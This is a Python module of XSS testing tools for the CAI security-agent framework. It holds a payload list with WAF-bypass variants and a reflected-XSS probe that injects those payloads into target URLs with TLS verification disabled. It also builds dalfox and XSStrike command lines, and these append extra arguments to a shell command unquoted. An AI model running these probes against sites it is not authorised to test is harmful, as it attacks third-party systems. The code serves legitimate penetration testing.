"""
XSS (Cross-Site Scripting) helper tools for CAI.

Provides common XSS payloads, a lightweight reflected-XSS probe built
on requests, and command builders for dalfox and XSStrike so an agent
can run them through generic_linux_command. Encoding helpers cover the
most common bypass transformations (URL, HTML entities, double URL).

These utilities complement the OWASP ZAP MCP server (in
examples/mcp/zap_example/): ZAP provides full spidering and scanning,
whereas this module is optimized for quick, parameter-level checks and
for orchestrating external CLI scanners like dalfox.
"""
from __future__ import annotations

import html
import shlex
from typing import List, Optional
from urllib.parse import parse_qsl, quote, urlencode, urlparse, urlunparse

import requests  # pylint: disable=E0401

from cai.sdk.agents import function_tool


# ── Payload catalogue ────────────────────────────────────────────────

DEFAULT_XSS_PAYLOADS: List[str] = [
    "<script>alert(1)</script>",
    "\"><script>alert(1)</script>",
    "'><script>alert(1)</script>",
    "<img src=x onerror=alert(1)>",
    "<svg/onload=alert(1)>",
    "javascript:alert(1)",
    "<body onload=alert(1)>",
    "<iframe src=\"javascript:alert(1)\"></iframe>",
    "\"><img src=x onerror=alert(1)>",
    "<details open ontoggle=alert(1)>",
    "<input autofocus onfocus=alert(1)>",
    "<a href=\"javascript:alert(1)\">click</a>",
    # Common WAF-bypass variants
    "<ScRiPt>alert(1)</ScRiPt>",
    "<script>alert`1`</script>",
    "<img src=x onerror=\"&#97;lert(1)\">",
]


def _generate_xss_payloads_impl(category: str = "all", limit: int = 0) -> str:
    category = (category or "all").lower()
    if category == "script":
        payloads = [p for p in DEFAULT_XSS_PAYLOADS if "<script" in p.lower()]
    elif category == "attribute":
        payloads = [p for p in DEFAULT_XSS_PAYLOADS if p.startswith(("\"", "'"))]
    elif category == "event":
        payloads = [p for p in DEFAULT_XSS_PAYLOADS if "on" in p.lower() and "=" in p]
    elif category == "waf-bypass":
        payloads = [
            p for p in DEFAULT_XSS_PAYLOADS
            if any(x in p for x in ("ScRiPt", "`", "&#"))
        ]
    else:
        payloads = list(DEFAULT_XSS_PAYLOADS)

    if limit and limit > 0:
        payloads = payloads[:limit]
    return "\n".join(payloads)


# ── Encoding helpers ─────────────────────────────────────────────────

def encode_xss_payload(payload: str, encoding: str = "url") -> str:
    """Encode an XSS payload.

    Supported encodings: ``url``, ``double-url``, ``html``, ``hex``.
    Unknown encodings return the payload unchanged.
    """
    if not payload:
        return ""
    encoding = (encoding or "url").lower()
    if encoding == "url":
        return quote(payload, safe="")
    if encoding == "double-url":
        return quote(quote(payload, safe=""), safe="")
    if encoding == "html":
        return html.escape(payload, quote=True)
    if encoding == "hex":
        return "".join(f"\\x{ord(c):02x}" for c in payload)
    return payload


# ── Reflected XSS probe ──────────────────────────────────────────────

def _inject_into_url(url: str, param: str, value: str) -> str:
    parsed = urlparse(url)
    pairs = parse_qsl(parsed.query, keep_blank_values=True)
    found = False
    new_pairs = []
    for key, val in pairs:
        if key == param:
            new_pairs.append((key, value))
            found = True
        else:
            new_pairs.append((key, val))
    if not found:
        new_pairs.append((param, value))
    return urlunparse(parsed._replace(query=urlencode(new_pairs)))


def _reflected_xss_probe_impl(  # pylint: disable=too-many-arguments,too-many-locals
    url: str,
    param: str = "",
    payloads: Optional[List[str]] = None,
    method: str = "GET",
    timeout: int = 10,
) -> str:
    test_payloads = payloads or DEFAULT_XSS_PAYLOADS
    parsed = urlparse(url)
    params_to_test = [param] if param else [k for k, _ in parse_qsl(parsed.query)]
    if not params_to_test:
        return (
            "No query parameters found in the URL and no param specified. "
            "Pass param='<name>' to inject into a parameter the endpoint expects."
        )

    lines = [f"=== Reflected XSS probe: {url} ==="]
    hit_count = 0

    for current_param in params_to_test:
        lines.append(f"\nParameter: {current_param}")
        for payload in test_payloads:
            try:
                if method.upper() == "POST":
                    data = {current_param: payload}
                    resp = requests.post(
                        url, data=data, timeout=timeout, verify=False,
                        allow_redirects=True,
                    )
                else:
                    target = _inject_into_url(url, current_param, payload)
                    resp = requests.get(
                        target, timeout=timeout, verify=False,
                        allow_redirects=True,
                    )
            except requests.RequestException as exc:
                lines.append(f"  [ERR] {payload!r}: {exc}")
                continue

            reflected = payload in resp.text
            marker = "REFLECTED" if reflected else "not reflected"
            if reflected:
                hit_count += 1
            lines.append(
                f"  [{marker}] status={resp.status_code} "
                f"len={len(resp.content)} payload={payload!r}"
            )

    lines.append(f"\n=== {hit_count} reflection(s) detected ===")
    if hit_count:
        lines.append(
            "Note: reflection ≠ exploitable XSS. Verify context "
            "(HTML body / attribute / JS) and run dalfox or XSStrike "
            "for full confirmation."
        )
    return "\n".join(lines)


# ── Command builders for external scanners ──────────────────────────

def _dalfox_command_impl(  # pylint: disable=too-many-arguments
    target: str,
    mode: str = "url",
    cookie: str = "",
    custom_payload_file: str = "",
    extra_args: str = "",
) -> str:
    mode = (mode or "url").lower()
    if mode not in {"url", "file", "pipe"}:
        return f"Error: invalid mode {mode!r}. Use 'url', 'file' or 'pipe'."

    parts = ["dalfox", mode, shlex.quote(target), "--silence"]
    if cookie:
        parts.extend(["-C", shlex.quote(cookie)])
    if custom_payload_file:
        parts.extend(["--custom-payload", shlex.quote(custom_payload_file)])
    if extra_args:
        parts.append(extra_args)
    return " ".join(parts)


def _xsstrike_command_impl(  # pylint: disable=too-many-arguments
    url: str,
    data: str = "",
    crawl: bool = False,
    skip_dom: bool = False,
    extra_args: str = "",
) -> str:
    parts = ["xsstrike", "-u", shlex.quote(url)]
    if data:
        parts.extend(["--data", shlex.quote(data)])
    if crawl:
        parts.append("--crawl")
    if skip_dom:
        parts.append("--skip-dom")
    if extra_args:
        parts.append(extra_args)
    return " ".join(parts)


# ── Public @function_tool surface ───────────────────────────────────

@function_tool(strict_mode=False)
def generate_xss_payloads(category: str = "all", limit: int = 0) -> str:
    """Return a newline-separated list of XSS payloads.

    Args:
        category: ``all`` (default), ``script``, ``attribute``, ``event``
            or ``waf-bypass`` — filters the catalogue by payload type.
        limit: Max number of payloads to return. ``0`` means no limit.

    Returns:
        Newline-separated payload list ready for fuzzing tools.
    """
    return _generate_xss_payloads_impl(category=category, limit=limit)


@function_tool(strict_mode=False)
def reflected_xss_probe(  # pylint: disable=too-many-arguments
    url: str,
    param: str = "",
    payloads: Optional[List[str]] = None,
    method: str = "GET",
    timeout: int = 10,
    ctf=None,  # pylint: disable=unused-argument
) -> str:
    """Probe a URL for reflected XSS by injecting payloads into a parameter.

    A payload is considered reflected when its literal form appears in
    the response body. This is a fast triage check — confirm positives
    manually or with dalfox / XSStrike before reporting.

    Args:
        url: Target URL, optionally with a query string.
        param: Parameter name to inject into. If empty, every existing
            query parameter is probed.
        payloads: Custom payload list. Defaults to ``DEFAULT_XSS_PAYLOADS``.
        method: ``GET`` (default) or ``POST``.
        timeout: Per-request timeout in seconds.

    Returns:
        Human-readable report listing reflections per parameter/payload.
    """
    return _reflected_xss_probe_impl(
        url=url, param=param, payloads=payloads,
        method=method, timeout=timeout,
    )


@function_tool(strict_mode=False)
def dalfox_command(  # pylint: disable=too-many-arguments
    target: str,
    mode: str = "url",
    cookie: str = "",
    custom_payload_file: str = "",
    extra_args: str = "",
    ctf=None,  # pylint: disable=unused-argument
) -> str:
    """Build a safe dalfox command line for use with generic_linux_command.

    Args:
        target: URL, file path, or pipe source depending on ``mode``.
        mode: ``url`` (default), ``file`` or ``pipe``.
        cookie: Optional cookie string, e.g. ``PHPSESSID=abc123``.
        custom_payload_file: Optional path to a user-supplied payload list.
        extra_args: Additional dalfox flags appended verbatim.

    Returns:
        A shell-safe dalfox command line.
    """
    return _dalfox_command_impl(
        target=target, mode=mode, cookie=cookie,
        custom_payload_file=custom_payload_file, extra_args=extra_args,
    )


@function_tool(strict_mode=False)
def xsstrike_command(  # pylint: disable=too-many-arguments
    url: str,
    data: str = "",
    crawl: bool = False,
    skip_dom: bool = False,
    extra_args: str = "",
    ctf=None,  # pylint: disable=unused-argument
) -> str:
    """Build an XSStrike command line for use with generic_linux_command.

    Args:
        url: Target URL.
        data: Optional POST body (will enable POST mode).
        crawl: Enable site crawling before scanning.
        skip_dom: Skip DOM-based XSS detection.
        extra_args: Additional flags appended verbatim.

    Returns:
        A shell-safe xsstrike command line.
    """
    return _xsstrike_command_impl(
        url=url, data=data, crawl=crawl,
        skip_dom=skip_dom, extra_args=extra_args,
    )
